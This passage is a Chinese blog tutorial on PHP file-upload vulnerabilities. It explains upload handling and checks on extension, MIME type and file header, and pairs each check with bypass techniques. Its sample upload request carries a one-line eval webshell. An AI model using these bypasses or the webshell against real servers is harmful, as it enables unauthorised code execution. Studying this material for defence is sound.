@@ -1,0 +1,307 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PHP文件上传漏洞"><meta name="keywords" content="文件上传,php"><meta name="author" content="Dar1in9"><meta name="copyright" content="Dar1in9"><title>PHP文件上传漏洞 | Dar1in9's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><link rel="dns-prefetch" href="http://ta.qq.com"><script>(function() {
+   var hm = document.createElement("script");
+   hm.src = "https://tajs.qq.com/stats?sId=&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=66549793&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;";
+   var s = document.getElementsByTagName("script")[0];
+   s.parentNode.insertBefore(hm, s);
+ })();</script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"MY1GAADR9W","apiKey":"5032629da4e94f659d98a4052bc1c5cd","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php中的文件上传"><span class="toc-number">1.</span> <span class="toc-text">php中的文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FILES"><span class="toc-number">1.1.</span> <span class="toc-text">$_FILES</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#和文件上传相关的一些函数"><span class="toc-number">1.2.</span> <span class="toc-text">和文件上传相关的一些函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#上传文件在http头中的表示"><span class="toc-number">2.</span> <span class="toc-text">上传文件在http头中的表示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#上传校验以及绕过校验"><span class="toc-number">3.</span> <span class="toc-text">上传校验以及绕过校验</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#客户端校验-js"><span class="toc-number">3.1.</span> <span class="toc-text">客户端校验(js)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#检验策略"><span class="toc-number">3.1.1.</span> <span class="toc-text">检验策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过"><span class="toc-number">3.1.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后缀名校验"><span class="toc-number">3.2.</span> <span class="toc-text">后缀名校验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#校验策略"><span class="toc-number">3.2.1.</span> <span class="toc-text">校验策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#content-type字段校验"><span class="toc-number">3.3.</span> <span class="toc-text">content-type字段校验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#校验"><span class="toc-number">3.3.1.</span> <span class="toc-text">校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件头校验"><span class="toc-number">3.4.</span> <span class="toc-text">文件头校验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#校验-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-3"><span class="toc-number">3.4.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件内容校验"><span class="toc-number">3.5.</span> <span class="toc-text">文件内容校验</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#校验-2"><span class="toc-number">3.5.1.</span> <span class="toc-text">校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-4"><span class="toc-number">3.5.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#图片二次渲染"><span class="toc-number">3.6.</span> <span class="toc-text">图片二次渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#校验-3"><span class="toc-number">3.6.1.</span> <span class="toc-text">校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-5"><span class="toc-number">3.6.2.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#限制Web服务器端对于特定类型文件的行为"><span class="toc-number">3.7.</span> <span class="toc-text">限制Web服务器端对于特定类型文件的行为</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-6"><span class="toc-number">3.7.1.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-ini"><span class="toc-number">3.8.</span> <span class="toc-text">.user.ini</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/01.png"></div><div class="author-info__name text-center">Dar1in9</div><div class="author-info__description text-center">人间值得，未来可期</div><div class="follow-button"><a href="https://github.com/Dar1in9s" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">56</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">21</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-1300147235.cos.ap-chengdu.myqcloud.com/18085.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Dar1in9's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">PHP文件上传漏洞</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-09</time><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.8k</span><span class="post-meta__separator">|</span><span>阅读时长: 17 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>​文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。<br>文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
+<a id="more"></a>
+<h1 id="php中的文件上传"><a href="#php中的文件上传" class="headerlink" title="php中的文件上传"></a>php中的文件上传</h1><h2 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h2><p>php中关于文件上传有一个超全局变量<code>$_FILES</code>，它是一个数组，其包含了所有上传的文件信息</p>
+<p>如果上传表单的<code>name</code>属性值为<code>file</code>，即：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>则<code>$_FILES</code>数组内容为：</p>
+<ul>
+<li><code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code> &emsp; 上传文件的原文件名</li>
+<li><code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code> &emsp; 文件的MIME类型<br>需要浏览器提供该信息的支持，例如”image/gif”</li>
+<li><code>$_FILES[&#39;file&#39;][&#39;size&#39;]</code> &emsp; 已上传文件的大小，单位为字节</li>
+<li><code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code> &emsp; 文件被上传后在服务端存储的临时文件名<ul>
+<li>在请求结束后该临时文件会被删除</li>
+</ul>
+</li>
+<li><code>$_FILES[&#39;file&#39;][&#39;error&#39;]</code> &emsp; 和该文件上传相关的错误代码<ul>
+<li><code>UPLOAD_ERR_OK</code> (0) 文件上传成功</li>
+<li><code>UPLOAD_ERR_INI_SIZE</code> (1)，上传的文件超过了<code>php.ini</code>中<code>upload_max_filesize</code>选项限制的值</li>
+<li><code>UPLOAD_ERR_FORM_SIZE</code> (2), 上传文件的大小超过了<code>HTML</code>表单中<code>MAX_FILE_SIZE</code>选项指定的值</li>
+<li><code>UPLOAD_ERR_PARTIAL</code> (3) ，文件只有部分被上传</li>
+<li><code>UPLOAD_ERR_NO_FILE</code> (4) ，没有文件被上传</li>
+<li><code>UPLOAD_ERR_NO_TMP_DIR</code> (6) ，找不到临时文件夹</li>
+<li><code>UPLOAD_ERR_CANT_WRITE</code> (7) ，文件写入失败</li>
+</ul>
+</li>
+</ul>
+<p>注意：php支持多文件上传，如果有多个文件，则上面的变量将会是一个数组，例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"file[]"</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"file[]"</span> <span class="attr">type</span>=<span class="string">"file"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>则：<code>$_FILES[&#39;file&#39;][&#39;name&#39;][0]</code>代表上传的第一个文件的文件名；<code>$_FILES[&#39;file&#39;][&#39;name&#39;][1]</code>代表上传的第二个文件的文件名</p>
+<h2 id="和文件上传相关的一些函数"><a href="#和文件上传相关的一些函数" class="headerlink" title="和文件上传相关的一些函数"></a>和文件上传相关的一些函数</h2><p><code>is_uploaded_file($filename)</code> &emsp; 判断文件是否是通过HTTP POST上传的</p>
+<p><code>move_uploaded_file($filename, $destination)</code> &emsp; 将上传的文件移动到新位置</p>
+<ul>
+<li>该函数会检查文件是否是通过http上传（相当于自动调用<code>is_uploaded_file($filename)</code>），如果其返回为true才会将其移动到新位置</li>
+<li>若成功，则返回 true，否则返回 false</li>
+<li>如果目标文件已经存在，将会被覆盖</li>
+<li>移动目的路径所在目录必须存在，此函数不会创建目录</li>
+</ul>
+<h1 id="上传文件在http头中的表示"><a href="#上传文件在http头中的表示" class="headerlink" title="上传文件在http头中的表示"></a>上传文件在http头中的表示</h1><p>先看看文件上传时的http请求</p>
+<p><img src="https://blog-1300147235.cos.ap-chengdu.myqcloud.com/20200408151358.png" alt="20200408151358"></p>
+<p>其中<strong>http请求头</strong>需要关注的是<code>Content-Type</code>，其固定格式为：<code>Content-Type: multipart/form-data; boundary=xxxxx</code></p>
+<ul>
+<li>其中<code>multipart/form-data</code>代表客户端要上传一个附件</li>
+<li><code>boundary</code>是一个分隔符，作用是分割多个表单项<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundarylL6aBcmKQZeKRomN</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>文件上传的<strong>http请求体</strong>由一个个表单项组合成，每一个表单项代表一个表单元素</p>
+<ul>
+<li>每个表单项由<code>--$boundary</code>开始，以<code>--$boundary</code>结尾。最后一个表单项以<code>--$boundary--</code>结尾，代表表单结束</li>
+<li>每一个表单项又由表单头和表单体组成<br><code>Content-Disposition</code>消息头第一个参数总是固定不变的<code>form-data</code>，<code>name</code>表示表单元素属性名<br><br>若该元素类型为<code>file</code>，则会多一个<code>filename</code>参数和<code>Content-Type</code>头。<code>filename</code>参数表示文件名，<code>Content-Type</code>头指明上传文件的<code>MIME</code>.<br><br>表单头回车换行符后面的内容就是表单体，内容就是元素的值或者上传的文件的内容<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundarylL6aBcmKQZeKRomN</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="upload"; filename="1.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php  eval($_POST[a]); ?&gt;</span><br><span class="line">------WebKitFormBoundarylL6aBcmKQZeKRomN</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">submit</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarylL6aBcmKQZeKRomN--</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>这样看来，文件上传的server端做的事情可以简单描述为以下步骤：</p>
+<ol>
+<li>读取http body部分，根据<code>boundary</code>分析出分隔符（这个串是唯一的，不会与body内其他数据冲突）</li>
+<li>根据实际分隔符分段获取 body </li>
+<li>内容遍历分段内容，根据<code>Content-Disposition</code>特征获取其中值</li>
+<li>根据值中<code>filename</code>或<code>name</code>区分是否是包含二进制流还是表单数据的key-value</li>
+<li>根据<code>filename</code>获取原始文件名</li>
+<li>按照二进制流读取上传文件流信息。</li>
+</ol>
+<p>完成后即有：原始文件名信息、原始文件类型信息、全部文件流信息</p>
+<h1 id="上传校验以及绕过校验"><a href="#上传校验以及绕过校验" class="headerlink" title="上传校验以及绕过校验"></a>上传校验以及绕过校验</h1><p>如果不设任何检测随意让用户上传文件，那么自己的服务器就会变成跑马场了。因此，网站一般都会设置上传文件的校验，但是如果校验不足，便就形成了<strong>一个文件上传漏洞</strong></p>
+<h2 id="客户端校验-js"><a href="#客户端校验-js" class="headerlink" title="客户端校验(js)"></a>客户端校验(js)</h2><h3 id="检验策略"><a href="#检验策略" class="headerlink" title="检验策略"></a>检验策略</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> filename = <span class="built_in">document</span>.getElementById(<span class="string">"file"</span>);</span><br><span class="line">    <span class="keyword">var</span> str = filename.value.split(<span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">var</span> ext = str[str.length<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ext==<span class="string">'jpg'</span>||ext==<span class="string">'png'</span>||ext==<span class="string">'jpeg'</span>||ext==<span class="string">'gif'</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        alert(<span class="string">"这不是图片！"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在表单中使用<code>onsumbit=check()</code>调用js函数来检查上传文件的扩展名.</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>这种限制实际上没有任何用处，任何攻击者都可以轻而易举的破解，编辑一下页面/用burpsuite/写个小脚本就可以突破</p>
+<h2 id="后缀名校验"><a href="#后缀名校验" class="headerlink" title="后缀名校验"></a>后缀名校验</h2><p>后缀名校验，就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</p>
+<h3 id="校验策略"><a href="#校验策略" class="headerlink" title="校验策略"></a>校验策略</h3><p>常见的有两种策略：白名单策略和黑名单策略。</p>
+<p><strong>黑名单策略</strong><br>文件扩展名在黑名单中的即为不合法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line">$black_list = [<span class="string">"php"</span>, <span class="string">"asp"</span>, <span class="string">"sh"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($postfix, $black_list))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"invalid file type"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>白名单策略</strong><br>文件扩展名不在白名单中的均为不合法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$postfix = end(explode(<span class="string">'.'</span>, $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line">$white_list = [<span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($postfix, $white_list))&#123;</span><br><span class="line">  <span class="comment">//save the file</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">"invalid file type"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>白名单策略是更加安全的，通过限制上传类型为只有我们接受的类型，可以较好的保证安全，因为黑名单我们可以使用各种方法来进行注入和突破</p>
+<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><ol>
+<li><p>使用黑名单中漏掉的后缀<br>常见可以解析为php的后缀有：<code>php、php3、php5、php7、pht、phtml</code><br>这取决于服务端的配置，比如apache中httpd.conf中的设置:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#指定 php 后缀的文件应该调用php模块去执行</span><br><span class="line">&lt;FilesMatch <span class="string">"\.php$"</span>&gt;</span><br><span class="line">    setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">#或在IfModule mime_module标签中末尾添加以下配置:</span><br><span class="line">设定了<span class="number">3</span>中后缀(.php、.php3、.pht 可以自定义后缀)都由php模块去执行</span><br><span class="line">AddType application/x-httpd-php .php .php3 .pht</span><br></pre></td></tr></table></figure></li>
+<li><p>可能存在大小写绕过漏洞</p>
+</li>
+<li><p>Web容器可能存在文件解析漏洞<br><strong>Apache 解析漏洞：</strong></p>
+<ul>
+<li>在Apache1.x，2.x中Apache解析文件的规则是<strong>从右到左</strong>开始判断解析的, 如果后缀名为不可识别文件, 就再往左判断。因此，index.php.abc也会被解析成php文件。<br> <strong>注意</strong>：如果php以<code>FASTCGI</code>的模式工作于Apache中，此种模式下php遇到类似aaa.php.xxx这种不是php程序的文件，会触发500错误。</li>
+<li>Apache解析漏洞CVE-2017-15715（Apache2.4.0到2.4.29）这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\x0A，如上传a.php，然后在burp中修改文件名为a.php\x0A)，以此来绕过一些黑名单过滤<br>具体可看：<a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a><br><strong>Nginx 解析漏洞:</strong><br>PHP CGI 解析漏洞。参考：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a><br>空字节代码执行漏洞。旧版本（0.5.x，**0.6.x，0.7，0.8&lt;=0.7.65&lt;=0.8.37）。恶意用户发出请求<code>http://example.com/file.ext％00.php</code>就会将<code>file.ext</code>作为PHP文件解析。</li>
+</ul>
+</li>
+<li><p>%00截断<br>条件：</p>
+<ol>
+<li><p>php版本小于5.3.29</p>
+</li>
+<li><p>php的magic_quotes_gpc为OFF状态</p>
+</li>
+<li><p>上传时路径可控</p>
+<p>原理：0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。<br>参考：<a href="http://www.admintony.com/关于上传中的00截断分析.html" target="_blank" rel="noopener">http://www.admintony.com/关于上传中的00截断分析.html</a></p>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h2><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改，不过加上一层防护也是可以有一定效果的</p>
+<p>常用的MIMETYPE：</p>
+<table>
+<thead>
+<tr>
+<th>MIME值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>text/plain</td>
+<td>纯文本</td>
+</tr>
+<tr>
+<td>text/html</td>
+<td>HTML文档</td>
+</tr>
+<tr>
+<td>text/javascript</td>
+<td>js代码</td>
+</tr>
+<tr>
+<td>application/xhtml+xml</td>
+<td>XHTML文档</td>
+</tr>
+<tr>
+<td>image/gif</td>
+<td>GIF图像</td>
+</tr>
+<tr>
+<td>image/jpeg</td>
+<td>JPEG图像</td>
+</tr>
+<tr>
+<td>image/png</td>
+<td>PNG图像</td>
+</tr>
+<tr>
+<td>video/mpeg</td>
+<td>MPEG动画</td>
+</tr>
+<tr>
+<td>application/octet-stream</td>
+<td>二进制数据</td>
+</tr>
+<tr>
+<td>application/pdf</td>
+<td>PDF文档</td>
+</tr>
+<tr>
+<td>application/(编程语言)</td>
+<td>该种语言的代码</td>
+</tr>
+<tr>
+<td>application/msword</td>
+<td>Microsoft Word文件</td>
+</tr>
+<tr>
+<td>message/rfc822</td>
+<td>RFC 822形式</td>
+</tr>
+<tr>
+<td>multipart/alternative</td>
+<td>HTML邮件的HTML形式和纯文本形式，相同内容使用不同形式表示</td>
+</tr>
+<tr>
+<td>application/x-www-form-urlencoded</td>
+<td>POST方法提交的表单</td>
+</tr>
+<tr>
+<td>multipart/form-data</td>
+<td>POST提交时伴随文件上传的表单</td>
+</tr>
+</tbody></table>
+<h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mimetype = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">var_dump($mimetype);</span><br><span class="line"><span class="keyword">if</span>(in_array($mimetype, <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>, <span class="string">'image/gif'</span>, <span class="string">'image/png'</span>))) &#123;</span><br><span class="line">  move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'/uploads/'</span> . $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'OK'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Upload a real image'</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h3><p>直接burp抓包修改上传文件表单项的<code>content-type</code>即可</p>
+<h2 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h2><p>利用每一个特定类型的文件都会有不太一样的开头或者标志位，可以对上传的文件进行一定的校验。</p>
+<p><code>exif_imagetype($filename)</code>函数(需要<code>php_exif</code>扩展) ：读取一个图像的第一个字节并检查其签名。<br><code>getimagesize($filename)</code> ：取得图像大小，返回一个数组。如果传入的文件不是图片(文件头)，则返回false</p>
+<ul>
+<li>索引<code>0</code>包含图像宽度的像素值</li>
+<li>索引<code>1</code>包含图像高度的像素值</li>
+<li>索引<code>2</code>是图像类型的标记(数字)</li>
+<li>索引<code>3</code>给出的是一个宽度和高度的字符串</li>
+<li>索引<code>channels</code>给出的是图像的通道值，RGB 图像默认是 3</li>
+<li>索引<code>mime</code>给出的是图像的 MIME 信息</li>
+</ul>
+<h3 id="校验-1"><a href="#校验-1" class="headerlink" title="校验"></a>校验</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!exif_imagetype($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"File is not an image"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$allow_mime = <span class="keyword">array</span>(<span class="string">"image/gif"</span>, <span class="string">"image/png"</span>, <span class="string">"image/jpeg"</span>);</span><br><span class="line">$imageinfo = getimagesize($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!in_array($imageinfo[<span class="string">'mime'</span>], $allow_mime)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"File type error!&lt;br&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过-3"><a href="#绕过-3" class="headerlink" title="绕过"></a>绕过</h3><p>当上传php文件时，可以使用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测</p>
+<p>常见图片的文件头(16进制)：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gif: <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> (文本的GIF89a) </span><br><span class="line"></span><br><span class="line">jpg、jpeg : FF D8 FF</span><br><span class="line"></span><br><span class="line">png : <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件内容校验"><a href="#文件内容校验" class="headerlink" title="文件内容校验"></a>文件内容校验</h2><p>这种检测主要是检测文件中的敏感字符。</p>
+<h3 id="校验-2"><a href="#校验-2" class="headerlink" title="校验"></a>校验</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$contents = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/&lt;\?php/i"</span>, $contents) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Error"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
